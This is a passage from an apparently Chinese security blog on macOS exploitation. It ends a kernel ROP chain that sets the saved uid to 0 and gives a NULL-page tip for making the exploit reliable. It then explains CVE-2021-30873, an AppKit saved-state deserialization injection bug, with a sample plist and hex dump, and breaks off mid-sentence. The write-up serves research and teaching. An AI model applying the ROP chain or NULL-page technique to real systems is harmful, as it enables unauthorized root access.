*/</span></span><br><span class="line">rop_stack[<span class="number">4</span>] = posix_cred_get;          <span class="comment">/*  rax = &amp;posix_cred               */</span></span><br><span class="line">rop_stack[<span class="number">5</span>] = xchg_rax_rdi;            <span class="comment">/*  rdi = &amp;posix_cred               */</span></span><br><span class="line">rop_stack[<span class="number">6</span>] = set_svuid_0;             <span class="comment">/*  we are now setuid 0             */</span></span><br><span class="line">rop_stack[<span class="number">7</span>] = thread_exception_return; <span class="comment">/*  stop rop </span></span><br></pre></td></tr></table></figure>

<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>漏洞利用有的时候会崩溃，原因是rax为0，改进方式是在0处分配假的vtable，实现方式是将exp编译为32位，以支持映射NULL page，同时还要使用一些特殊的链接标志，以使mach-o文件不会有一个__PAGEZERO节。</p>
<h1 id="CVE-2021-30873"><a href="#CVE-2021-30873" class="headerlink" title="CVE-2021-30873"></a>CVE-2021-30873</h1><p>一个影响基于AppKit开发的应用程序的进程注入漏洞。</p>
<h2 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h2><p>macOS 11.3之前。</p>
<h2 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>漏洞出现在Mac的状态保存机制上，状态保存用于重启后恢复应用程序的状态，或者，将在Dock中的长时间不使用的应用程序关闭掉（虽然看上去Dock中的图标和界面都在，实际上只是一个图片），在应用程序被点击后再依据保存的状态进行恢复。</p>
<p>当使用AppKit开发时，状态保存功能是自动被添加的，所以这个漏洞和AppKit有关。</p>
<p>状态保存需要写入两个文件：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">~/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/windows.plist</span><br><span class="line">~/Library/Saved Application State/&lt;Bundle ID&gt;.savedState/data.data</span><br></pre></td></tr></table></figure>

<p>plist文件类似下面这种：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">plist</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;-//Apple//DTD PLIST 1.0//EN&quot;</span> <span class="string">&quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">plist</span> <span class="attr">version</span>=<span class="string">&quot;1.0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>MenuBar AvailableSpace<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">real</span>&gt;</span>1248<span class="tag">&lt;/<span class="name">real</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSDataKey<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">		Ay1IqBriwup4bKAanpWcEw==</span><br><span class="line">		<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSIsMainMenuBar<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowID<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">integer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowNumber<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">integer</span>&gt;</span>5978<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSDataKey<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">		5lyzOSsKF24yEcwAKTBSVw==</span><br><span class="line">		<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSDragRegion<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">		AAAAgAIAAADAAQAABAAAAAMAAABHAgAAxgEAAAoAAAADAAAABwAAABUAAAAb</span><br><span class="line">		AAAAKQAAAC8AAAA9AAAARwIAAMcBAAAMAAAAAwAAAAcAAAAVAAAAGwAAACkA</span><br><span class="line">		AAAvAAAAPQAAAAkBAABLAQAARwIAANABAAAKAAAAFQAAABsAAAApAAAALwAA</span><br><span class="line">		AD0AAAAJAQAASwEAAD4CAADWAQAABgAAAAwAAAAJAQAASwEAAD4CAADXAQAA</span><br><span class="line">		BAAAAAwAAAA+AgAA2QEAAAIAAAD///9/</span><br><span class="line">		<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSTitle<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>Untitled<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSUIID<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>_NS:34<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowCloseButtonFrame<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>&#123;&#123;7, 454&#125;, &#123;14, 16&#125;&#125;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowFrame<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>177 501 586 476 0 0 1680 1025 <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowID<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">integer</span>&gt;</span>2<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowLevel<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">integer</span>&gt;</span>0<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowMiniaturizeButtonFrame<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>&#123;&#123;27, 454&#125;, &#123;14, 16&#125;&#125;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowNumber<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">integer</span>&gt;</span>5982<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowWorkspaceID<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowZoomButtonFrame<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>&#123;&#123;47, 454&#125;, &#123;14, 16&#125;&#125;<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>CFBundleVersion<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">string</span>&gt;</span>378<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSDataKey<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">		P7BYxMryj6Gae9Q76wpqVw==</span><br><span class="line">		<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSDockMenu<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>command<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">integer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>mark<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">integer</span>&gt;</span>2<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>name<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">string</span>&gt;</span>Untitled<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>system-icon<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">integer</span>&gt;</span>1735879022<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>tag<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">integer</span>&gt;</span>2<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>separator<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">dict</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>command<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">integer</span>&gt;</span>2<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>indent<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">integer</span>&gt;</span>0<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>name<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">string</span>&gt;</span>New Document<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">key</span>&gt;</span>tag<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">				<span class="tag">&lt;<span class="name">integer</span>&gt;</span>0<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSExecutableInode<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">integer</span>&gt;</span>1152921500311961010<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSIsGlobal<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">true</span>/&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSSystemAppearance<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">data</span>&gt;</span></span><br><span class="line">		YnBsaXN0MDDUAQIDBAUGBwpYJHZlcnNpb25ZJGFyY2hpdmVyVCR0b3BYJG9i</span><br><span class="line">		amVjdHMSAAGGoF8QD05TS2V5ZWRBcmNoaXZlctEICVRyb290gAGkCwwRElUk</span><br><span class="line">		bnVsbNINDg8QViRjbGFzc18QEE5TQXBwZWFyYW5jZU5hbWWAA4ACXxAUTlNB</span><br><span class="line">		cHBlYXJhbmNlTmFtZUFxdWHSExQVFlokY2xhc3NuYW1lWCRjbGFzc2VzXE5T</span><br><span class="line">		QXBwZWFyYW5jZaIVF1hOU09iamVjdAgRGiQpMjdJTFFTWF5jan1/gZidqLG+</span><br><span class="line">		wQAAAAAAAAEBAAAAAAAAABgAAAAAAAAAAAAAAAAAAADK</span><br><span class="line">		<span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSSystemVersion<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">integer</span>&gt;</span>12<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">integer</span>&gt;</span>2<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">integer</span>&gt;</span>1<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowID<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">integer</span>&gt;</span>4294967295<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">key</span>&gt;</span>NSWindowZOrder<span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">array</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">integer</span>&gt;</span>5982<span class="tag">&lt;/<span class="name">integer</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">dict</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">plist</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>data.data文件包含自定义二进制格式，包含一系列的记录，每个记录包含AES-CBC加密的序列化对象。windows.plist文件则包含和记录相对应的key (<code>NSDataKey</code>)和ID(<code>NSWindowID</code>)。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span>  <span class="number">4</span>e <span class="number">53</span> <span class="number">43</span> <span class="number">52</span> <span class="number">31</span> <span class="number">30</span> <span class="number">30</span> <span class="number">30</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">01</span> b0  |NSCR1000........|</span><br><span class="line"><span class="number">00000010</span>  ec f2 <span class="number">26</span> b9 <span class="number">8b</span> <span class="number">06</span> c8 d0  <span class="number">41</span> <span class="number">5</span>d <span class="number">73</span> <span class="number">7</span>a <span class="number">0</span>e cc <span class="number">59</span> <span class="number">74</span>  |..&amp;.....A]sz..Yt|</span><br><span class="line"><span class="number">00000020</span>  <span class="number">89</span> ac <span class="number">3</span>d b3 b6 <span class="number">7</span>a ab <span class="number">1b</span>  bb f7 <span class="number">84</span> <span class="number">0</span>c <span class="number">05</span> <span class="number">57</span> <span class="number">4</span>d <span class="number">70</span>  |..=..z.......WMp|</span><br><span class="line"><span class="number">00000030</span>  cb <span class="number">55</span> <span class="number">7f</span> ee <span class="number">71</span> f8 <span class="number">8b</span> bb  d4 fd b0 c6 <span class="number">28</span> <span class="number">14</span> <span class="number">78</span> <span class="number">23</span>  |.U..q.......(.x#|</span><br><span class="line"><span class="number">00000040</span>  ed <span class="number">89</span> <span class="number">30</span> <span class="number">29</span> <span class="number">92</span> <span class="number">8</span>c <span class="number">80</span> bf  <span class="number">47</span> <span class="number">75</span> <span class="number">28</span> <span class="number">50</span> d7 <span class="number">1</span>c <span class="number">9</span>a <span class="number">8</span>a  |.<span class="number">.0</span>)....Gu(P....|</span><br><span class="line"><span class="number">00000050</span>  <span class="number">94</span> b4 d1 c1 <span class="number">5</span>d <span class="number">9</span>e <span class="number">1</span>a e0  <span class="number">46</span> <span class="number">62</span> f5 <span class="number">16</span> <span class="number">76</span> f5 <span class="number">6f</span> df  |....]...Fb..v.o.|</span><br><span class="line"><span class="number">00000060</span>  <span class="number">43</span> a5 fa <span class="number">7</span>a dd d3 <span class="number">2f</span> <span class="number">25</span>  <span class="number">43</span> <span class="number">04</span> ba e2 <span class="number">7</span>c <span class="number">59</span> f9 e8  |C..z../%C...|Y..|</span><br><span class="line"><span class="number">00000070</span>  a4 <span class="number">0</span>e <span class="number">11</span> <span class="number">5</span>d <span class="number">8</span>e <span class="number">86</span> <span class="number">16</span> f0  c5 <span class="number">1</span>d ac fb <span class="number">5</span>c <span class="number">71</span> fd <span class="number">9</span>d  |...]........\q..|</span><br><span class="line"><span class="number">00000080</span>  <span class="number">81</span> <span class="number">90</span> c8 e7 <span class="number">2</span>d <span class="number">53</span> <span class="number">75</span> <span class="number">43</span>  <span class="number">6</span>d eb b6 aa c7 <span class="number">15</span> <span class="number">8b</span> <span class="number">1</span>a  |....-SuCm.......|</span><br><span class="line"><span class="number">00000090</span>  <span class="number">9</span>c <span class="number">58</span> <span class="number">8f</span> <span class="number">19</span> <span class="number">02</span> <span class="number">1</span>a <span class="number">73</span> <span class="number">99</span>  ed <span class="number">66</span> d1 <span class="number">91</span> <span class="number">8</span>a <span class="number">84</span> <span class="number">32</span> <span class="number">7f</span>  |.X....s..f...<span class="number">.2</span>.|</span><br><span class="line"><span class="number">000000</span>a0  <span class="number">1f</span> <span class="number">5</span>a <span class="number">1</span>e e8 ae b3 <span class="number">39</span> a8  cf <span class="number">6b</span> <span class="number">96</span> ef d8 <span class="number">7b</span> d1 <span class="number">46</span>  |.Z...<span class="number">.9</span>..k...&#123;.F|</span><br><span class="line"><span class="number">000000b</span>0  <span class="number">0</span>c e2 <span class="number">97</span> d5 db d4 <span class="number">9</span>d eb  d6 <span class="number">13</span> <span class="number">05</span> <span class="number">7</span>d e0 <span class="number">4</span>a <span class="number">89</span> a4  |...........&#125;.J..|</span><br><span class="line"><span class="number">000000</span>c0  d0 aa <span class="number">40</span> <span class="number">16</span> <span class="number">81</span> fc b9 a5  f5 <span class="number">88</span> <span class="number">2b</span> <span class="number">70</span> cd <span class="number">1</span>a <span class="number">48</span> <span class="number">94</span>  |..@.......+p..H.|</span><br><span class="line"><span class="number">000000</span>d0  <span class="number">47</span> <span class="number">3</span>d <span class="number">4f</span> <span class="number">92</span> <span class="number">76</span> <span class="number">3</span>a ee <span class="number">34</span>  <span class="number">79</span> <span class="number">05</span> <span class="number">3f</span> <span class="number">5</span>d <span class="number">68</span> <span class="number">57</span> <span class="number">7</span>d b0  |G=O.v:<span class="number">.4</span>y.?]hW&#125;.|</span><br><span class="line"><span class="number">000000e0</span>  <span class="number">54</span> <span class="number">6f</span> <span class="number">80</span> <span class="number">4</span>e <span class="number">5b</span> <span class="number">3</span>d <span class="number">53</span> <span class="number">2</span>a  <span class="number">6</span>d <span class="number">35</span> a3 c9 <span class="number">6</span>c <span class="number">96</span> <span class="number">5f</span> a5  |To.N[=S*m5..l._.|</span><br><span class="line"><span class="number">000000f</span>0  <span class="number">06</span> ec <span class="number">4</span>c d3 <span class="number">51</span> b9 <span class="number">15</span> b8  <span class="number">29</span> f0 <span class="number">25</span> <span class="number">48</span> <span class="number">2b</span> <span class="number">6</span>a <span class="number">74</span> <span class="number">9f</span>  |..L.Q...).%H+jt.|</span><br><span class="line"><span class="number">00000100</span>  <span class="number">1</span>a <span class="number">5b</span> <span class="number">5</span>e f1 <span class="number">14</span> db aa <span class="number">8</span>d  <span class="number">13</span> <span class="number">9</span>c ef d6 f5 <span class="number">53</span> f1 <span class="number">49</span>  |.[^..........S.I|</span><br><span class="line"><span class="number">00000110</span>  <span class="number">4</span>d <span class="number">78</span> <span class="number">5</span>a <span class="number">89</span> <span class="number">79</span> f8 bd <span class="number">68</span>  <span class="number">3f</span> <span class="number">51</span> a2 a4 <span class="number">04</span> ee d1 <span class="number">45</span>  |MxZ.y..h?Q.....E|</span><br><span class="line"><span class="number">00000120</span>  <span class="number">65</span> ba c4 <span class="number">40</span> ad db e3 <span class="number">62</span>  <span class="number">55</span> <span class="number">59</span> <span class="number">9</span>a <span class="number">29</span> <span class="number">46</span> <span class="number">2</span>e <span class="number">6</span>c <span class="number">07</span>  |e..@...bUY.)F.l.|</span><br><span class="line"><span class="number">00000130</span>  <span class="number">34</span> <span class="number">68</span> e9 <span class="number">00</span> <span class="number">89</span> <span class="number">15</span> <span class="number">37</span> <span class="number">1</span>c  ff c8 a5 d8 <span class="number">7</span>c <span class="number">8</span>d b2 f0  |<span class="number">4</span>h...<span class="number">.7</span>.....|...|</span><br><span class="line"><span class="number">00000140</span>  <span class="number">4b</span> c3 <span class="number">26</span> f9 <span class="number">91</span> f8 c4 <span class="number">2</span>d  <span class="number">12</span> <span class="number">4</span>a <span class="number">09</span> ba <span class="number">26</span> <span class="number">1</span>d <span class="number">00</span> <span class="number">13</span>  |K.&amp;....-.J..&amp;...|</span><br><span class="line"><span class="number">00000150</span>  <span class="number">65</span> ac e7 <span class="number">66</span> <span class="number">80</span> c0 e2 <span class="number">55</span>  ec <span class="number">9</span>a <span class="number">8</span>e <span class="number">09</span> cb <span class="number">39</span> <span class="number">26</span> d4  |e..f...U....<span class="number">.9</span>&amp;.|</span><br><span class="line"><span class="number">00000160</span>  c8 <span class="number">15</span> <span class="number">94</span> d8 <span class="number">2</span>c <span class="number">8b</span> fa <span class="number">79</span>  <span class="number">5f</span> <span class="number">62</span> <span class="number">18</span> <span class="number">39</span> f0 a5 df <span class="number">0b</span>  |....,..y_b<span class="number">.9</span>....|</span><br><span class="line"><span class="number">00000170</span>  <span class="number">3</span>d a4 <span class="number">5</span>c bc <span class="number">30</span> d5 <span class="number">2b</span> cc  <span class="number">08</span> <span class="number">88</span> c8 <span class="number">49</span> d6 ab c0 e1  |=.\<span class="number">.0</span>.+....I....|</span><br><span class="line"><span class="number">00000180</span>  c1 e5 <span class="number">41</span> eb <span class="number">3</span>e <span class="number">2b</span> <span class="number">17</span> <span class="number">80</span>  c4 <span class="number">01</span> <span class="number">64</span> <span class="number">3</span>d <span class="number">79</span> be <span class="number">82</span> aa  |..A.&gt;+....d=y...|</span><br><span class="line"><span class="number">00000190</span>  <span class="number">3</span>d <span class="number">56</span> <span class="number">8</span>d bb e5 <span class="number">7</span>a ea <span class="number">89</span>  <span class="number">0f</span> <span class="number">4</span>c dc <span class="number">16</span> <span class="number">03</span> e9 <span class="number">2</span>a d8  |=V...z...L....*.|</span><br><span class="line"><span class="number">000001</span>a0  c5 <span class="number">3</span>e <span class="number">25</span> ed c2 <span class="number">4b</span> <span class="number">65</span> da  <span class="number">8</span>a d9 <span class="number">0</span>d d9 <span class="number">23</span> <span class="number">92</span> fd <span class="number">06</span>  |.&gt;%..Ke.....#...|</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>

<p>漏洞在于存储在data.data中的加密序列化对象没有使用安全编码API。</p>
<h3 id="Objective-C-serialization"><a href="#Objective-C-serialization" class="headerlink" title="Objective-C serialization"></a>Objective-C serialization</h3><p>类可以通过NSCoding实现序列化，实现的类必须包含Coder方法：</p>
<figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- (<span class="type">id</span>)initWithCoder:(<span class="built_in">NSCoder</span> *)coder;</span><br></pre></td></tr></table></figure>

<p>在这个方法中，对象可以使用coder去解码它的实例变量，可以使用的方法有：<code>-decodeObjectForKey:</code>, <code>-decodeIntegerForKey:</code>, <code>-decodeDoubleForKey:</code>等。当使用-decodeObjectForKey:方法时，可以在该对象上递归调用-initWithCoder:方法，直至解码整个对象。</p>
<p>Apple认识到-decodeObjectForKey:方法是有风险的，于是在10.8上加入了 <code>NSSecureCoding</code>安全编码方法。</p>
<p>原本的方法是先创建一个对象，再检查它的类型，引入安全编码后，变成了在解码时，需要先指定一系列类。</p>
<p>不安全的：</p>
